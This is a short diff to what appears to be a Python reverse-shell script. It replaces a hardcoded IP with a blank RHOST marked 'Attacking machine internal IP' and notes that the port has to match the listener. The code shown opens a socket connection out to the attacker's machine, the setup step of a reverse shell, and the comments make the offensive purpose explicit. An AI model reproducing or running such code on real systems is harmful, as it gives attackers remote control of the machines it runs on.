@@ -2,8 +2,8 @@
  
 import socket,subprocess,sys
  
-RHOST = "192.168.0.8"
-RPORT = 443
+RHOST = "" # Attacking machine internal IP
+RPORT = 443 # Port has to be the same in listener
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((RHOST, RPORT))
  
